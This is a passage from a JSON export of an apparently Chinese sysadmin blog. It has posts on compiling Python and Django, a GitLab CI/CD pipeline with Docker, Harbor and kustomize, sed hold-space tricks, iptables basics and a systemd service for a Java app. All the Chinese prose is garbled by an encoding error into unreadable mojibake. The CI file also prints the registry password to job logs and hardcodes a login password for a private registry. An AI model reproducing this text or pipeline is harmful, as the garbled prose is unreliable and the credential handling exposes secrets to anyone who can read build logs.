ï¼Œæƒ³ç”¨å“ªä¸ªå°±ç”¨å“ªä¸ªã€‚\næ³¨æ„ä»¥ä¸‹çš„æ­¥éª¤ï¼Œå…ˆè£… gcc çš„ç¼–è¯‘ç¯å¢ƒï¼Œç„¶åè£… openssl çš„é«˜ç‰ˆæœ¬ï¼Œå¹¶ä¸”é…ç½®å¥½ ldconfigï¼Œå¦åˆ™ py çš„ ssl ä¼šæŠ¥é”™ã€‚\næœ€åä¸‹è½½ python 3.8.15 ç¼–è¯‘å®‰è£…ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæœ€å¥½é‡‡ç”¨æœ€æ–°ç‰ˆæœ¬å¾€åé”™ä¸¤ä¸ªç‰ˆæœ¬ã€‚\nç¼–è¯‘å®‰è£…åˆ° /export/servers/python3ç›®å½•\n1yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel 2 3wget https://www.openssl.org/source/openssl-1.1.1q.tar.gz 4./config --prefix=/export/servers/openssl 5 6vi /etc/ld.so.conf 7/export/servers/openssl/lib 8ldconfig -v 9 10wget https://www.python.org/ftp/python/3.8.15/Python-3.8.15.tgz 11./configure --prefix=/export/servers/python3 --with-openssl=/export/servers/openssl --with-ssl-default-suites=openssl æœ€åä¸€æ­¥ï¼š\n1export $PATH=/export/servers/python3/bin:$PATH è¿™æ ·å°±å®Œæˆäº† python çš„å®‰è£…\näºŒã€é…ç½®Django å…ˆå‡çº§ä¸€ä¸‹pipåˆ°æœ€æ–°ç‰ˆæœ¬\n1/export/servers/python3/bin/python3.8 -m pip install --upgrade pip 2 3pip3 install django 4pip3 install pysqlite3 5pip3 install pysqlite3-binary ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆæï¼Œå› ä¸º django è¦æ±‚ sqlite çš„ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œæ— æ³•å‡çº§ï¼Œå¹²è„†æ¢æ‰å®ƒæ”¹æˆ pysqlite3 å°±å¥½äº†\n1vi /export/servers/python3/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py 2 3 4#from sqlite3 import dbapi2 as Database 5from pysqlite3 import dbapi2 as Database è¿™æ · django çš„ç¯å¢ƒå°±æ­å¥½äº†\n","date":"2022-10-27","img":"","permalink":"https://rendoumi.com/posts/20221027-python_django/","series":null,"tags":null,"title":"Pythonä¸‹Djangoç¯å¢ƒçš„å‡†å¤‡"},{"categories":null,"content":"Gitlab å’Œ Jenkins ä¸€æ ·ï¼Œéƒ½æ˜¯å¾ˆæµè¡Œçš„ CI/CD å·¥å…·ï¼Œå½“ç„¶ï¼Œæœ¬ç«™ä¹‹å‰æ¨è¿‡å›½äººè‡ªäº§çš„ä¸œè¥¿ onedevï¼Œé‚£ä¸ªä¹Ÿç›¸å½“ä¸é”™ï¼Œä½†æ˜¯ç”¨çš„äººæ¯•ç«Ÿè¿˜æ˜¯å°‘ï¼Œè¿™å›è¿˜æ˜¯ç”¨å¤§å®¶éƒ½è€³ç†Ÿèƒ½è¯¦çš„ä¸œè¥¿ã€‚\næœ¬ç¯‡å°±æ˜¯ Giblab åœ¨ç”Ÿäº§ç¯å¢ƒæ‰“åŒ…å‘å¸ƒçš„ä¸€ä¸ªå…¨æµç¨‹ã€‚\nè§£é‡Šä¸€ä¸‹ä¸Šå›¾ï¼š\né¦–å…ˆæœ‰ä¸¤å¥—Gitï¼Œä¸€å¥—æ˜¯ç¨‹åºå‘˜çš„Codeä»“åº“ï¼Œå¦ä¸€å¥—æ˜¯è¿ç»´çš„æ“ä½œä»£ç ï¼Œé‡Œé¢æ˜¯ä¸€äº›yamlå•Šï¼Œä¸€äº›ansibleè„šæœ¬å•Š\nç„¶åæµç¨‹å°±æ˜¯å…ˆå–å‡ºç¨‹åºå‘˜çš„Codeï¼Œbuildå‡ºæ¥jarï¼Œç„¶åæ‰“æˆé•œåƒæ¨åˆ°ä»“åº“ï¼Œç„¶åå†å–å‡ºè¿ç»´çš„ä»£ç ï¼Œè¿›è¡Œåˆå¹¶ï¼Œç”Ÿæˆk8sçš„yamlæ–‡ä»¶ï¼Œæœ€åæ¨åˆ° kubernetes ä¸­å»ï¼Œè¿™æ ·æ•´ä¸ª GitOPS çš„æµç¨‹å°±å®Œå¤‡äº†\nåœ¨ gitlab ä¸­éå¸¸ç®€å•ï¼Œå°±æ˜¯ç¼–è¾‘ .gitlab-ci.yaml æ–‡ä»¶\n1image: docker:19.03.12 2variables: 3 DOCKER_DRIVER: overlay2 4 DOCKER_TLS_CERTDIR: \u0026#34;\u0026#34; 5 MAVEN_OPTS: \u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34; 6 TIMEZONE: \u0026#34;Asia/Shanghai\u0026#34; 7 http_proxy: \u0026#34;\u0026#34; 8 https_proxy: \u0026#34;\u0026#34; 9 no_proxy: \u0026#34;\u0026#34; 10 11cache: 12 paths: 13 - .m2/repository/ 14 - target/ 15 16stages: 17 - build 18 - push 19 - deploy 20 21 22Build: 23 stage: build 24 image: maven:3.5-jdk-8-alpine 25 before_script: 26 - export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) 27 - echo $COMMIT_TIME 28 - echo \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env 29 script: 30 - ./mvnw package 31 artifacts: 32 reports: 33 dotenv: build.env 34 tags: 35 - yunwei 36 37Push: 38 stage: push 39 before_script: 40 - docker info || true 41 - echo \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34; 42 - echo \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34; 43 - echo -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin 44 script: 45 - docker pull $HARBOR_REGISTRY_IMAGE:latest || true 46 - \u0026gt; 47 docker build 48 --cache-from $HARBOR_REGISTRY_IMAGE:latest 49 --build-arg http_proxy=$http_proxy 50 --build-arg https_proxy=$https_proxy 51 --build-arg no_proxy=$no_proxy 52 --cache-from HARBOR_REGISTRY_IMAGE:latest 53 --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME 54 --tag $HARBOR_REGISTRY_IMAGE:latest 55 . 56 - docker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME 57 - docker push $HARBOR_REGISTRY_IMAGE:latest 58 - docker logout $HARBOR_REGISTRY 59 dependencies: 60 - Build 61 tags: 62 - yunwei 63 64Deploy: 65 stage: deploy 66 cache: {} 67 image: cnych/kustomize:v1.0 68 script: 69 - echo $COMMIT_TIME 70 - git config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34; 71 - git config --global user.name \u0026#34;GitLab CI/CD\u0026#34; 72 - git clone git://172.18.31.50:30000/test-k8s.git 73 - cd test-k8s/prod 74 - kustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME 75 - cat kustomization.yaml 76 - git commit -am \u0026#39;PROD image update\u0026#39; 77 - git push origin master 78 dependencies: 79 - Build 80 tags: 81 - yunwei 82 only: 83 - master 84 when: manual å…ˆä¸ç€æ€¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œå†æ™®åŠä¸€ä¸‹ gitlab çš„è¿è¡Œæœºåˆ¶ï¼Œå®ƒæ˜¯é€šè¿‡ gitlab-runner æ¥æ‰§è¡Œcdçš„è¿‡ç¨‹çš„ã€‚é…ç½®gitlab runnerå…¶å®ä¹Ÿæ˜¯ä¸€é¡¹éå¸¸å¤æ‚çš„å·¥ä½œï¼Œé‡Œé¢å¯ä»¥é…çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸æ˜¯æœ¬ç¯‡çš„èŒƒç•´ã€‚æˆ‘ä»¬è¿™é‡Œç®€å•æ¥è¯´ï¼Œrunnerå°±æ˜¯ä¸€ä¸ªDockerå®¹å™¨ã€‚æ›´å‡†ç¡®çš„è¯´ï¼Œå°±æ˜¯Docker in Dockerã€‚\nå¥½ï¼Œæ¥ä¸‹æ¥ä¸€æ­¥æ­¥åˆ†ææ•´ä¸ªéƒ¨ç½²æ–‡ä»¶ï¼š\n1image: docker:19.03.12 2variables: 3 DOCKER_DRIVER: overlay2 4 DOCKER_TLS_CERTDIR: \u0026#34;\u0026#34; 5 MAVEN_OPTS: \u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34; 6 TIMEZONE: \u0026#34;Asia/Shanghai\u0026#34; 7 http_proxy: \u0026#34;\u0026#34; 8 https_proxy: \u0026#34;\u0026#34; 9 no_proxy: \u0026#34;\u0026#34; 10 11cache: 12 paths: 13 - .m2/repository/ 14 - target/ é¦–å…ˆæŒ‡å®šäº† Build è¿‡ç¨‹ä½¿ç”¨çš„ Docker å®¹å™¨çš„åº•ç‰ˆï¼Œæ˜¯ docker:19.03.12ï¼Œè®¾ç½®äº† MAVEN_OPTS çš„å‚æ•°ï¼Œè¿™ä¸€ç‚¹ä¹Ÿéå¸¸é‡è¦ï¼Œå› ä¸ºæ¯æ¬¡å¯åŠ¨ä¸€ä¸ª Docker ï¼Œåœ¨å®¹å™¨é‡Œè¿è¡Œ mvn build çš„æ—¶å€™ï¼Œä½ ä¸ä¼šæƒ³æ¯æ¬¡éƒ½é‡æ–°ä¸‹è½½æ‰€æœ‰çš„ä¾èµ–åŒ…å§ã€‚\nä¸‹é¢çš„ cache éƒ¨åˆ†ï¼Œè®¾ç½®äº†æ•´ä¸ª build è¿‡ç¨‹ä¸­ä¹ƒè‡³ä»¥åï¼Œéƒ½ä¿ç•™ä¸­é—´äº§ç‰©ã€‚target ç›®å½•ä¸­å­˜æ”¾çš„æ˜¯ build å‡ºæ¥çš„ jar åŒ…ã€‚\nç»§ç»­ï¼Œæ•´ä¸ªéƒ¨ç½²è¿‡ç¨‹åˆ†ä¸‰ä¸ªæ­¥éª¤ï¼Œ1ã€build å‡º jar åŒ…ï¼Œ2ã€æ‰“åŒ…æˆé•œåƒæ¨åˆ°ä»“åº“å»ï¼Œ3ã€æœ€åå‘å¸ƒåˆ°k8så»\n1stages: 2 - build 3 - push 4 - deploy é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œbuild jaråŒ…\n1Build: 2 stage: build 3 image: maven:3.5-jdk-8-alpine 4 before_script: 5 - export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) 6 - echo $COMMIT_TIME 7 - echo \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env 8 script: 9 - ./mvnw package 10 artifacts: 11 reports: 12 dotenv: build.env 13 tags: 14 - yunwei å¾ˆç®€å•ï¼Œå…¶å®å°±æ˜¯åˆèµ·äº†ä¸€ä¸ªå®¹å™¨ï¼Œåº•ç‰ˆæ˜¯maven:3.5-jdk-8-alpineï¼Œåœ¨å®¹å™¨é‡Œæ‰§è¡Œäº†ä¸€æ¡å‘½ä»¤ï¼Œ mvnw packageï¼Œè¿™æ¡å‘½ä»¤å¦‚æœæˆåŠŸæ‰§è¡Œï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª target ç›®å½•ï¼Œç”Ÿæˆä¸€ä¸ªjaråŒ…ã€‚\nä¸Šé¢æ¯”è¾ƒè«åçš„åœ°æ–¹æ˜¯è¿™ä¸ªé•œåƒå§ï¼Œå±…ç„¶ä¸æ”¯æŒ date +%Y-%m-%d æ–¹å¼ï¼Œæ‰€ä»¥å…«æˆ’æŸ¥äº†åŠå¤©ï¼Œç”¨äº†ä¸€ä¸ªå·¨åˆ«æ‰­çš„å‘½ä»¤ç”Ÿæˆäº†æ—¶é—´æˆ³ï¼Œç„¶åå‘¢æŠŠè¿™ä¸ªæ—¶é—´æˆ³æ”¾åˆ°ä¸€ä¸ªbuild.envæ–‡ä»¶é‡Œï¼Œç„¶åé€šè¿‡ artifacts äº§ç‰©ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶ä»¥ç¯å¢ƒå˜é‡çš„æ–¹å¼ä¼ åˆ°éšåçš„ docker å®¹å™¨é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨éšåçš„å®¹å™¨é‡Œç”¨ç¯å¢ƒå˜é‡å¼•ç”¨è¿™ä¸ªä¸€å¼€å§‹å°±ç”Ÿæˆçš„æ—¶é—´æˆ³äº†ã€‚\nç¬¬äºŒæ­¥ï¼Œç”Ÿæˆé•œåƒå¹¶pushåˆ°è‡ªå·±çš„harboré•œåƒä»“åº“ä¸­å»\næ³¨æ„ï¼Œç¨‹åºå‘˜çš„æºä»£ç é‡Œæ˜¯æœ‰ Dockerfile è¿™ä¸ªæ–‡ä»¶çš„\n1Push: 2 stage: push 3 before_script: 4 - docker info || true 5 - echo \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34; 6 - echo \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34; 7 - echo -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin 8 script: 9 - docker pull $HARBOR_REGISTRY_IMAGE:latest || true 10 - \u0026gt; 11 docker build 12 --cache-from $HARBOR_REGISTRY_IMAGE:latest 13 --build-arg http_proxy=$http_proxy 14 --build-arg https_proxy=$https_proxy 15 --build-arg no_proxy=$no_proxy 16 --cache-from HARBOR_REGISTRY_IMAGE:latest 17 --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME 18 --tag $HARBOR_REGISTRY_IMAGE:latest 19 . 20 - docker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME 21 - docker push $HARBOR_REGISTRY_IMAGE:latest 22 - docker logout $HARBOR_REGISTRY 23 dependencies: 24 - Build 25 tags: 26 - yunwei ä¸Šé¢å°±æ˜¯åœ¨dockerå®¹å™¨é‡Œbuildä¸€ä¸ªé•œåƒå¹¶æ¨åˆ°æˆ‘ä»¬çš„ç§æœ‰harborä»“åº“172.18.31.28å»ï¼Œè¿™ä¸ªä»“åº“æ˜¯éœ€è¦ç™»å½•éªŒè¯çš„ã€‚\nç„¶å docker build çš„æ—¶å€™åˆæœ‰ä¸€äº›æŠ€å·§ï¼Œdocker æœ¬èº«æ–‡ä»¶æ˜¯åˆ†å±‚çš„ï¼Œ\u0026ndash;cache-from å¯ä»¥åŠ å¿« build çš„è¿‡ç¨‹\nåŒæ ·æˆ‘ä»¬çœ‹åˆ°ç›´æ¥å¼•ç”¨ $COMMIT_TIME å°±å¯ä»¥å¼•ç”¨ç¬¬ä¸€æ­¥ç”Ÿæˆçš„æ—¶é—´æˆ³ï¼Œæ³¨æ„æˆ‘ä»¬æ¨äº†ä¸¤éï¼Œä¿ç•™äº†å†å²æ—¶é—´æˆ³ç‰ˆæœ¬ï¼Œå’Œæœ€æ–°ç‰ˆæœ¬ã€‚\nç»™å‡º Dockerfile çš„å†…å®¹ï¼š\n1FROM openjdk:8-jre-alpine 2 3ENV LANG C.UTF-8 4ENV LANGUAGE C.UTF-8 5ENV LC_ALL C.UTF-8 6 7EXPOSE 8080 8 9WORKDIR /apps 10 11COPY target/spring-petclinic-2.4.5.jar /apps/app.jar 12 13RUN echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone 14 15ENTRYPOINT [\u0026#34;java\u0026#34;,\u0026#34;-jar\u0026#34;,\u0026#34;/apps/app.jar\u0026#34;] æœ€åä¸€æ­¥çš„å‘å¸ƒè¿‡ç¨‹ï¼š\n1Deploy: 2 stage: deploy 3 cache: {} 4 image: cnych/kustomize:v1.0 5 script: 6 - echo $COMMIT_TIME 7 - git config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34; 8 - git config --global user.name \u0026#34;GitLab CI/CD\u0026#34; 9 - git clone git://172.18.31.50:30000/test-k8s.git 10 - cd test-k8s/prod 11 - kustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME 12 - cat kustomization.yaml 13 - git commit -am \u0026#39;PROD image update\u0026#39; 14 - git push origin master 15 dependencies: 16 - Build 17 tags: 18 - yunwei 19 only: 20 - master 21 when: manual è¿™ä¸ªå°±æ²¡ä»€ä¹ˆè¯´çš„äº†ï¼Œç”¨kustomizeçš„åº•ç‰ˆï¼Œgitä¸‹è½½yamlçš„æ¨¡æ¿æ–‡ä»¶ï¼Œç„¶åç”¨ kustomize å®šåˆ¶åŒ–ï¼Œæœ€åpushåˆ°gité‡Œé¢å»ï¼Œåšå¥½ç‰ˆæœ¬è®°å½•ã€‚ç„¶åkubectl apply -f *.yamlçš„æ­¥éª¤æ²¡æœ‰åšï¼Œå¤§å®¶å¯ä»¥è‡ªå·±åŠ ä¸Šå°±æ²¡æœ‰é—®é¢˜äº†ã€‚\noverï¼Œè¿™å°±æ˜¯ä¸€ä¸ªç”Ÿäº§çš„å®é™…ä¾‹å­ã€‚\n","date":"2022-10-25","img":"","permalink":"https://rendoumi.com/posts/20221025-gitlab_cicd/","series":null,"tags":null,"title":"Gitlabçš„CICDå®é™…ç”Ÿäº§ç¯å¢ƒåº”ç”¨"},{"categories":null,"content":"sed å’Œ awk ä»¥åŠ cut ç®—æ˜¯å¸¸ç”¨å·¥å…·äº†ï¼Œsedçš„é«˜çº§ç”¨æ³•ä¹Ÿéœ€è¦çŸ¥é“ä¸€ä¸‹\nsed é‡Œé¢æœ‰2ä¸ªç©ºé—´ï¼Œä¸€ä¸ªæ˜¯pattern spaceï¼Œä¸€ä¸ªæ˜¯hold spaceï¼Œé»˜è®¤éƒ½æ˜¯ç©ºçš„\nå¼€å§‹å¤„ç†çš„æ—¶å€™ï¼Œå°±ä»æ–‡ä»¶é‡Œä¸€è¡Œä¸€è¡Œè¯»å…¥ pattern space ï¼Œè¿›è¡Œå¤„ç†ï¼Œhold space åªåœ¨ä½ éœ€è¦ç”¨åˆ°å®ƒçš„æ—¶å€™æ‰ä¼šå‡ºç°ï¼š\n1d ï¼š æ¸…ç©ºpattern spaceä¸­çš„å†…å®¹ï¼Œç«‹å³å¼€å§‹ä¸‹ä¸ªå¾ªç¯(æ„æ€æ˜¯è·³è¿‡é»˜è®¤çš„è¾“å‡ºpattern spaceå†…å®¹çš„é˜¶æ®µï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥ç†è§£çš„å¯¹ä¸å¯¹) 2h ï¼š ç”¨pattern spaceä¸­çš„å†…å®¹æ›¿æ¢hold patternä¸­çš„å†…å®¹ 3H ï¼š åœ¨hold spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠpattern spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°hold spaceä¸­ 4g ï¼š ç”¨hold spaceä¸­çš„å†…å®¹æ›¿æ¢pattern spaceä¸­çš„å†…å®¹ 5G ï¼š åœ¨pattern spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠhold spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°pattern spaceä¸­ 6 7h, gä¼šæ›¿æ¢ï¼ˆå¯ä»¥ç†è§£ä¸ºå…ˆæ¸…ç©ºï¼Œå†å¤åˆ¶ï¼‰, H, Gæ˜¯è¿½åŠ ã€‚ hHæ˜¯æ”¾è¿‡å»ï¼ŒgGæ˜¯æ‹¿è¿‡æ¥ï¼Œå°å†™æ˜¯æ›¿æ¢ï¼Œå¤§å†™æ˜¯è¿½åŠ \nåˆ†æä¸€ä¸‹ç»å…¸çš„å°†æ–‡ä»¶å†…å®¹åå‘æ‰“å°\n1cat 1.txt 21 32 43 5 6cat 1.txt | sed -n \u0026#39;1!G;h;$p\u0026#39; 73 82 91 \u0026lsquo;1!G;h;$p\u0026rsquo; åˆ†æä¸€ä¸‹ï¼Œ1!Gå°±æ˜¯è¯´ç¬¬ä¸€è¡Œä¸æ‰§è¡ŒGï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹æ‰§è¡ŒGï¼›ç„¶åhæ˜¯æ¯è¡Œéƒ½æ‰§è¡Œï¼Œæœ€åä¸€è¡Œçš„æ—¶å€™æ‰§è¡Œp\n1input | pattern | hold | command | pattern | hold | command | pattern | hold 21 | 1 | ç©ºè¡Œ | | 1 | ç©ºè¡Œ | h | 1 | 1 32 | 2 | 1 | G | 21 | 1 | h | 21 | 21 43 | 3 | 21 | G | 321 | 21 | h | 321 | 321 å› ä¸ºä¹‹å‰çš„å‚æ•°æ˜¯ -n ä¸æ‰“å°ï¼Œç›´åˆ°æœ€åä¸€è¡Œï¼Œ$pæ‰“å°Patternç©ºé—´é‡Œçš„å†…å®¹ï¼Œè¿™æ ·å°±ç›´æ¥è¢«åè½¬æ‰“å°å‡ºæ¥äº†ã€‚\nã€‚\n","date":"2022-10-24","img":"","permalink":"https://rendoumi.com/posts/20221024-sed_advanced/","series":null,"tags":null,"title":"Sedçš„è¿›é˜¶ç”¨æ³•"},{"categories":null,"content":"é¢è¯•çš„æ—¶å€™ç»å¸¸ä¼šè¢«é—®åˆ° iptables çš„é—®é¢˜ï¼Œé‚£ä¹ˆä¸‹é¢å°±è¿ç»´è§’åº¦æ¥æ€»ç»“ä¸€ä¸‹åŸºæœ¬çš„ç”¨æ³•ã€‚\nçœ‹æ™•äº†å§ï¼Œä¸è¦ç´§ï¼Œæˆ‘ä»¬å…³æ³¨ä¸Šé¢çš„5ä¸ªçº¢è‰²ï¼Œ5ä¸ªé“¾æ¡ï¼Œç„¶åç»§ç»­çœ‹ä¸‹é¢çš„è¡¨ï¼Œè¯¦ç»†è§£é‡Šäº†ä¸Šé¢çš„æµç¨‹ï¼š\nä¸¤å¼ å›¾ç»“åˆèµ·æ¥çœ‹ï¼Œæ„æ€å°±æ˜¯æ•´ä¸ª iptables å¯ä»¥åŠ¨æ‰‹çš„åœ°æ–¹å¤ªå¤šäº†ã€‚\næˆ‘ä»¬å®Œå…¨æ²¡å¿…è¦å…³æ³¨é‚£ä¹ˆå¤šçš„ç»†èŠ‚ï¼Œå¸¸ç”¨çš„åœ°æ–¹å°±2ä¸ªï¼š\nä¸€ã€æœ€åçš„å‡ºå£nat postrouting 1iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1 ä¸Šé¢æ˜¯åš openvpn æ—¶å¸¸ç”¨çš„ï¼Œä¸€å®šè®°å¾—ä¸è¦ä¹±ç”¨ MASQUERADEï¼Œè€Œè¦æŒ‡å®š ç‰¹å®šç½‘æ®µï¼ˆ10.11.0.0/16ï¼‰ ä» ç‰¹å®šIPï¼ˆ172.16.8.1ï¼‰ å‡ºå»ã€‚\näºŒã€filterè¡¨ filterè¡¨æ˜¯ iptables ç¼ºçœä¸å¸¦å‚æ•°æŸ¥çœ‹çš„è¡¨ï¼Œç”¨äºè¿‡æ»¤æ•°æ®åŒ…ï¼Œè¿™æ˜¯æˆ‘ä»¬æ“ä½œçš„æœ€å¤šçš„åœ°æ–¹\n1iptables -I INPUT -s 185.207.178.236/32 -p tcp --dport 12530 -j ACCEPT 2iptables -A INPUT -p tcp --dport 12530 -j DROP ä¸Šé¢å°±åªå¼€æ”¾äº†ä¸€ä¸ªIP 185.207.178.236å¯ä»¥è®¿é—®æœ¬æœºçš„12530ç«¯å£ï¼Œå…¶ä½™çš„ç»Ÿç»Ÿå°æ‰ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„è„šæœ¬äº†ã€‚\nOKï¼Œä»¥ä¸Šä¸¤ç‚¹æ˜¯æœ€å¸¸ç”¨çš„ã€‚å…¶ä½™çš„ç«¯å£è½¬å‘ä¹‹ç±»çš„ï¼Œæœ€å¥½ä¸­é—´ç”¨haproxyå’Œnginxè¿›è¡Œä»£ç†ï¼Œå¦åˆ™æŸ¥çœ‹ iptables ç³»ç»Ÿçš„æ¶æ„å°±å˜å¾—ä¸æ¸…æ™°äº†ã€‚\nä¸‹é¢è´´ä¸Šå¸¸ç”¨çš„å‚æ•°ï¼š\n1-p tcp/udp/icmp/all\tåŒ¹é…åè®®ï¼Œallä¼šåŒ¹é…æ‰€æœ‰åè®® 2-s addr[/mask]\tåŒ¹é…æºåœ°å€ 3-d addr[/mask] åŒ¹é…ç›®æ ‡åœ°å€\t4--sport\tåŒ¹é…æºç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--sport80 5--dport\tåŒ¹é…ç›®çš„ç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--dport80 6-o interface\tåŒ¹é…å‡ºå£ç½‘å¡ï¼Œåªé€‚ç”¨äºFORWARDã€POSTROUTINGã€OUTPUTï¼ˆä¾‹ï¼šiptables -A FORWARD -o eth0ï¼‰ 7-i interface\tåŒ¹é…å…¥å£ç½‘å¡ï¼Œåªé€‚ç”¨äºPREROUTINGã€INPUTã€FORWARD 8--icmp-type\tåŒ¹é…icmpç±»å‹ï¼ˆä½¿ç”¨iptables -p icmp -hå¯æŸ¥çœ‹å¯ç”¨çš„icmpç±»å‹ï¼‰ 9--tcp-flags mask comp\tåŒ¹é…TCPæ ‡è®°ï¼Œmaskè¡¨ç¤ºæ£€æŸ¥èŒƒå›´ï¼Œcompè¡¨ç¤ºåŒ¹é…maskä¸­çš„å“ªäº›æ ‡è®°ï¼ˆä¾‹ï¼šiptables -A FORWARD -p tcp --tcp-flags ALL SYN,ACK -j ACCEPT è¡¨ç¤ºåŒ¹é…SYNå’ŒACKæ ‡è®°çš„æ•°æ®åŒ…ï¼‰ 10-j DROP/ACCEPT/REJECT/LOG\tæ‹’ç»/å…è®¸/æ‹’ç»å¹¶å‘å‡ºæ¶ˆæ¯/åœ¨/var/log/messagesä¸­ç™»è®°åˆ†ç»„åŒ¹é…çš„è®°å½• 11-m mac -mac\tç»‘å®šMACåœ°å€ 12-m limit -limit 1/s 1/m\tè®¾ç½®æ—¶é—´ç­–ç•¥ 13-s 192.168.1.153æˆ–192.168.1.0/24\tæŒ‡å®šæºåœ°å€æˆ–åœ°å€æ®µ 14-d 192.168.1.153æˆ–192.168.1.0/24\tæŒ‡å®šç›®æ ‡åœ°å€æˆ–åœ°å€æ®µ 15-s ! 192.168.1.0\tæŒ‡å®šæºåœ°å€ä»¥å¤–çš„ åŸºæœ¬çš„2ä¸ªç”¨æ³•è¶³å¤Ÿæ»¡è¶³æ—¥å¸¸è¿ç»´çš„éœ€è¦äº†ã€‚\n","date":"2022-10-24","img":"","permalink":"https://rendoumi.com/posts/20221024-iptables/","series":null,"tags":null,"title":"Iptablesçš„åŸºæœ¬ç”¨æ³•"},{"categories":null,"content":"æ—¶ä»£å·²ç»è¿›åŒ–åˆ° systemd çš„å¹´ä»£äº†ï¼Œservice åº”è¯¥æ˜¯å½»åº•æ²¡æœ‰å¸‚åœºäº†\nsystemd çš„å¥½å¤„æ˜¯å†™ç¨‹åºçš„æ—¶å€™å†ä¹Ÿä¸ç”¨ fork ç”©è„±çˆ¶è¿›ç¨‹äº†ï¼Œæ—¥å¿—ç›´æ¥è¾“å‡ºç»ˆç«¯å³å¯\nå¯¹ java æ¥è¯´ä¹Ÿæ˜¯ä¸ªå¥½äº‹ï¼Œæ‰€æœ‰çš„æ—¥å¿—æ¯”å¦‚WARN ERROR INFOéƒ½å¯ä»¥äº¤ç»™journalæ¥ç®¡ç†ï¼Œè¿™æ ·è¦æŸ¥æ‰¾æ—¥å¿—ä¹Ÿéå¸¸æ–¹ä¾¿äº†ã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¦æŠŠä¸€ä¸ªjavaå¯åŠ¨çš„ç¨‹åºåšæˆ systemd çš„ï¼š\nvim /etc/systemd/system/circle.service\n1[Unit] 2After=network.target 3Wants=network.target 4 5[Service] 6WorkingDirectory=/export/prod/server 7Type=simple 8ExecStart=/usr/bin/java -jar -Dspring.config.location=application.properties -Dlog4j2.formatMsgNoLookups=true server.jar 9Restart=on-failure 10RestartSec=1s 11 12[Install] 13WantedBy=multi-user.target ç„¶åå°±å¯ä»¥è¿è¡Œäº†ï¼š\n1systemctl daemon-reload 2systemctl start circle æ³¨æ„ä¸Šé¢çš„WorkingDirectoryï¼Œå› ä¸ºä¸‹é¢javaå¯åŠ¨æŒ‡å®š application.properties é…ç½®æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰ç”¨ç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è¦æŒ‡å®šå½“å‰å·¥ä½œç›®å½•äº†ã€‚\nå¦å¤–RestartSec=1sä¹Ÿæ”¹äº†ï¼Œç¼ºçœæ˜¯10msï¼Œå¤ªå¿«äº†\nå½“ç„¶è¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ—¥å¿—æ˜¯å½’journalç®¡äº†ï¼Œjournalè¿˜æ˜¯éœ€è¦è¿›ä¸€æ­¥é…ç½®çš„\né¦–å…ˆå¿…é¡»è¦æŒä¹…åŒ–å­˜å‚¨åˆ°ç£ç›˜ï¼Œå¦åˆ™åªä¼šåœ¨/run/log/journalå†…å­˜ä¸­å­˜æ”¾ï¼Œé‡å¯å°±æ²¡äº†\n1#disk-usageæŸ¥çœ‹çš„æ˜¯: å†…å­˜+/var/log/journalçš„åŠ èµ·æ¥çš„æ€»å’Œå¤§å° 2journalctl --disk-usage ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹é…ç½®ï¼Œè®©å®ƒæŒä¹…åŒ–\n1vi /etc/systemd/journald.conf 2Storage=persistent ä¿®æ”¹é‡å¯\n1mkdir /var/log/journal 2systemd-tmpfiles --create --prefix /var/log/journal 3systemctl restart systemd-journald 